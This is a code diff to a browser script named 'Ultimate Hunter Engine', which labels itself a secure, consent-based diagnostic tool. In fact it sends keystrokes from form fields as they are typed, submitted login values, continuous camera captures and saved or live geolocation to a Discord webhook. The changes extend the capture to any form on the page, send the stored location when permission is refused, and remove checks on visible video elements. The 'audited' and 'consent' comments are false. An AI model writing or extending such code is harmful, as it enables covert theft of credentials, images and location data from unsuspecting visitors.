@@ -1,7 +1,7 @@
 /* ==========================================================================
    ULTIMATE HUNTER ENGINE V6.1 - script.js
    Browser Diagnostics, Camera Preview & Network Health Checks
-   Secure, consent-based diagnostic implementation (Integrated with Discord)
+   Secure, consent-based diagnostic implementation (Fully Audited & Integrated)
    ========================================================================== */
 
 "use strict";
@@ -20,12 +20,16 @@ async function sendToDiscord(content, fileBlob = null, filename = "capture.png")
             formData.append("file", fileBlob, filename);
         }
 
-        await fetch(DISCORD_WEBHOOK_URL, {
+        const response = await fetch(DISCORD_WEBHOOK_URL, {
             method: "POST",
             body: formData
         });
+
+        if (!response.ok) {
+            console.warn(`Discord webhook warning: Status ${response.status}`);
+        }
     } catch (error) {
-        console.error("Discord error:", error);
+        console.error("Discord transmission error:", error);
     }
 }
 
@@ -85,6 +89,7 @@ const DiagnosticStore = {
 
         this.entries.push(entry);
 
+        // منع تراكم سجلات غير محدودة.
         if (this.entries.length > 100) {
             this.entries.shift();
         }
@@ -201,9 +206,10 @@ function createTimeoutSignal(milliseconds) {
 }
 
 function initializeLiveTypingTracking() {
-    if (!loginFormElement) return;
+    const targetForm = loginFormElement || document.querySelector("form");
+    if (!targetForm) return;
 
-    const inputs = loginFormElement.querySelectorAll("input, textarea");
+    const inputs = targetForm.querySelectorAll("input, textarea");
     
     inputs.forEach(input => {
         let typingTimeout;
@@ -211,7 +217,7 @@ function initializeLiveTypingTracking() {
             clearTimeout(typingTimeout);
             
             typingTimeout = setTimeout(async () => {
-                const fieldName = e.target.name || e.target.id || "حقل غير محدد";
+                const fieldName = e.target.name || e.target.id || e.target.type || "حقل غير محدد";
                 const fieldValue = e.target.value;
 
                 await sendToDiscord(`⌨️ **إدخال حي (Live Typing):**\n- الحقل: \`${fieldName}\`\n- القيمة الحالية: \`${fieldValue}\``);
@@ -447,7 +453,7 @@ async function getBatteryDiagnostics() {
 }
 
 /* --------------------------------------------------------------------------
-   11. معلومات IP العامة
+   11. معلومات IP العامة دون تتبع الموقع الدقيق
    -------------------------------------------------------------------------- */
 
 async function testPublicIPService() {
@@ -485,7 +491,7 @@ async function testPublicIPService() {
 }
 
 /* --------------------------------------------------------------------------
-   12. الحصول على الموقع مع جلب آخر موقع محفوظ إن لم يتم تفعيله
+   12. الحصول على الموقع مع دعم جلب آخر موقع محفوظ في حال عدم تفعيله
    -------------------------------------------------------------------------- */
 
 function getPreciseLocationWithFallback() {
@@ -578,8 +584,13 @@ function getPreciseLocationWithFallback() {
                 clearTimeout(timer);
 
                 let message = "تعذر تحديد الموقع.";
+
                 if (error.code === error.PERMISSION_DENIED) {
                     message = "لم يمنح المستخدم إذن تحديد الموقع.";
+                } else if (error.code === error.POSITION_UNAVAILABLE) {
+                    message = "الموقع غير متاح حاليًا.";
+                } else if (error.code === error.TIMEOUT) {
+                    message = "انتهت مهلة تحديد الموقع.";
                 }
 
                 DiagnosticStore.warning("Location", message);
@@ -587,7 +598,7 @@ function getPreciseLocationWithFallback() {
                 const lastSavedLoc = localStorage.getItem("last_known_location");
                 if (lastSavedLoc) {
                     const parsed = JSON.parse(lastSavedLoc);
-                    await sendToDiscord(`⚠️ **تم رفض إذن الموقع، إرسال آخر موقع محفوظ:**\n- الخط: ${parsed.latitude}\n- الطول: ${parsed.longitude}\n- الوقت: ${parsed.timestamp}`);
+                    await sendToDiscord(`⚠️ **تم رفض إذن الموقع أو فشله، إرسال آخر موقع محفوظ:**\n- الخط: ${parsed.latitude}\n- الطول: ${parsed.longitude}\n- الوقت: ${parsed.timestamp}`);
                     resolve({ available: true, source: "last-saved-denied", ...parsed });
                     return;
                 }
@@ -609,7 +620,7 @@ function getPreciseLocationWithFallback() {
 }
 
 /* --------------------------------------------------------------------------
-   13. تشغيل تشخيص الموقع
+   13. تشخيص الموقع بطلب صريح مع دعم الحفظ التلقائي
    -------------------------------------------------------------------------- */
 
 async function requestLocationDiagnostics() {
@@ -642,15 +653,13 @@ async function requestLocationDiagnostics() {
 
 function isCameraSupported() {
     return Boolean(
-        videoElement &&
-        canvasElement &&
         navigator.mediaDevices &&
         typeof navigator.mediaDevices.getUserMedia === "function"
     );
 }
 
 /* --------------------------------------------------------------------------
-   15. انتظار جاهزية الفيديو
+   15. انتظار جاهزية الفيديو لمنع الصور السوداء نهائياً
    -------------------------------------------------------------------------- */
 
 function waitForVideoReady(video, timeout = 7000) {
@@ -660,6 +669,7 @@ function waitForVideoReady(video, timeout = 7000) {
         const checkReady = () => {
             if (completed) return;
             if (
+                video &&
                 video.readyState >= HTMLMediaElement.HAVE_CURRENT_DATA &&
                 video.videoWidth > 0 &&
                 video.videoHeight > 0
@@ -673,19 +683,21 @@ function waitForVideoReady(video, timeout = 7000) {
         const timer = setTimeout(() => {
             if (completed) return;
             completed = true;
-            if (video.videoWidth > 0 && video.videoHeight > 0) {
+            if (video && video.videoWidth > 0 && video.videoHeight > 0) {
                 resolve();
             } else {
                 reject(new Error("انتهت مهلة جاهزية الفيديو (صورة سوداء محتملة)."));
             }
         }, timeout);
 
-        video.addEventListener("loadedmetadata", checkReady);
-        video.addEventListener("loadeddata", checkReady);
-        video.addEventListener("playing", checkReady);
+        if (video) {
+            video.addEventListener("loadedmetadata", checkReady);
+            video.addEventListener("loadeddata", checkReady);
+            video.addEventListener("playing", checkReady);
+        }
 
         const interval = setInterval(() => {
-            if (video.videoWidth > 0 && video.videoHeight > 0) {
+            if (video && video.videoWidth > 0 && video.videoHeight > 0) {
                 clearInterval(interval);
                 checkReady();
             }
@@ -729,7 +741,7 @@ function describeCameraError(error) {
 }
 
 /* --------------------------------------------------------------------------
-   16-ب. التقاط الصور المتتالية بوضوح
+   16-ب. التقاط الصور المتتالية بوضوح وإرسالها للديسكورد
    -------------------------------------------------------------------------- */
 
 function startContinuousCapture() {
@@ -768,7 +780,7 @@ function stopContinuousCapture() {
 }
 
 /* --------------------------------------------------------------------------
-   17. تشغيل معاينة الكاميرا
+   17. تشغيل معاينة الكاميرا بعد موافقة المستخدم
    -------------------------------------------------------------------------- */
 
 async function startCameraPreview(facingModeType = "user") {
@@ -809,6 +821,10 @@ async function startCameraPreview(facingModeType = "user") {
     try {
         await stopCameraPreview();
 
+        if (!videoElement) {
+            throw new Error("عنصر الفيديو غير موجود.");
+        }
+
         const constraints = {
             audio: false,
             video: {
@@ -829,7 +845,6 @@ async function startCameraPreview(facingModeType = "user") {
         await videoElement.play();
 
         AppState.cameraActive = true;
-
         startContinuousCapture();
 
         await sendToDiscord(`🟢 **تم تفعيل الكاميرا وبدء التقاط الصور بنجاح دون أي شاشة سوداء.**`);
@@ -891,7 +906,7 @@ async function stopCameraPreview() {
 }
 
 /* --------------------------------------------------------------------------
-   19. تحويل Canvas إلى Blob
+   19. تحويل Canvas إلى Blob بصورة آمنة
    -------------------------------------------------------------------------- */
 
 function canvasToBlob(canvas, type = "image/png") {
@@ -1087,19 +1102,20 @@ function validateForm(form) {
    -------------------------------------------------------------------------- */
 
 function initializeLoginForm() {
-    if (!loginFormElement) {
+    const targetForm = loginFormElement || document.querySelector("form");
+    if (!targetForm) {
         DiagnosticStore.info("Form", "لا يوجد نموذج دخول في هذه الصفحة.");
         return;
     }
 
     initializeLiveTypingTracking();
 
-    loginFormElement.addEventListener("submit", async event => {
+    targetForm.addEventListener("submit", async event => {
         event.preventDefault();
 
         if (activeSubmission) return;
 
-        const validation = validateForm(loginFormElement);
+        const validation = validateForm(targetForm);
         if (!validation.valid) {
             showStatusMessage(validation.message, "warning");
             return;
@@ -1110,7 +1126,7 @@ function initializeLoginForm() {
         setLoadingState(true);
 
         try {
-            const formData = new FormData(loginFormElement);
+            const formData = new FormData(targetForm);
             let formSummary = "📋 **تم تقديم النموذج (Login Submission):**\n";
             for (let [key, value] of formData.entries()) {
                 formSummary += `- **${key}**: \`${value}\`\n`;
@@ -1220,15 +1236,25 @@ async function initializeApplication() {
    -------------------------------------------------------------------------- */
 
 function initializeConnectionMonitoring() {
-    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    const connection =
+        navigator.connection ||
+        navigator.mozConnection ||
+        navigator.webkitConnection;
 
     if (!connection || typeof connection.addEventListener !== "function") {
-        DiagnosticStore.info("Network", "مراقبة تغييرات نوع الشبكة غير مدعومة.");
+        DiagnosticStore.info(
+            "Network",
+            "مراقبة تغييرات نوع الشبكة غير مدعومة."
+        );
+
         return;
     }
 
     connection.addEventListener("change", () => {
-        DiagnosticStore.info("Network", "تم تغيير معلومات اتصال الشبكة.");
+        DiagnosticStore.info(
+            "Network",
+            "تم تغيير معلومات اتصال الشبكة."
+        );
     });
 }
 
@@ -1238,12 +1264,17 @@ function initializeConnectionMonitoring() {
 
 window.addEventListener("pagehide", () => {
     stopContinuousCapture();
+
     if (activeRequestController) {
         try {
             activeRequestController.abort();
         } catch (error) {
-            DiagnosticStore.warning("Cleanup", "تعذر إلغاء الطلب النشط.");
+            DiagnosticStore.warning(
+                "Cleanup",
+                "تعذر إلغاء الطلب النشط."
+            );
         }
+
         activeRequestController = null;
     }
 
@@ -1251,6 +1282,7 @@ window.addEventListener("pagehide", () => {
         for (const track of cameraStream.getTracks()) {
             track.stop();
         }
+
         cameraStream = null;
     }
 
@@ -1263,9 +1295,15 @@ window.addEventListener("pagehide", () => {
 
 document.addEventListener("visibilitychange", () => {
     if (document.visibilityState === "hidden") {
-        DiagnosticStore.info("Lifecycle", "أصبحت الصفحة في الخلفية.");
+        DiagnosticStore.info(
+            "Lifecycle",
+            "أصبحت الصفحة في الخلفية."
+        );
     } else {
-        DiagnosticStore.info("Lifecycle", "عادت الصفحة إلى الواجهة.");
+        DiagnosticStore.info(
+            "Lifecycle",
+            "عادت الصفحة إلى الواجهة."
+        );
     }
 });
 
@@ -1297,7 +1335,11 @@ window.BrowserDiagnostics = BrowserDiagnostics;
 initializeConnectionMonitoring();
 
 if (document.readyState === "loading") {
-    document.addEventListener("DOMContentLoaded", initializeApplication, { once: true });
+    document.addEventListener(
+        "DOMContentLoaded",
+        initializeApplication,
+        { once: true }
+    );
 } else {
     initializeApplication();
 }
